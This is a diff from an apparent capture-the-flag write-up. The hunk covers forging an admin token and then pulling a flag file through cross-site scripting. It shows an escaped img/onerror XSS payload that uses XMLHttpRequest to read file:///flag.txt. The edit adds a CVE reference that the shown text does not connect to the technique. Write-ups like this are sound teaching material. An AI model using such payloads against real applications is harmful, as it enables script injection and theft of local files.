@@ -17,7 +17,7 @@ To solve this challenge, we analyze the source code provided.
    - Submit the modified token with the admin JSON payload and its signature.
 
 4. **Retrieving the Flag via XSS**:
-   - Create another document containing the following XSS payload to retrieve the flag:
+   - Create another document containing the following XSS payload to retrieve the flag: using CVE-2023-0835
      ```html
      &lt;img src=x onerror="xhr=new XMLHttpRequest;xhr.onload=function(){document.write(xhr.responseText)};xhr.open('GET','file:///flag.txt');xhr.send()"&gt;
      ```
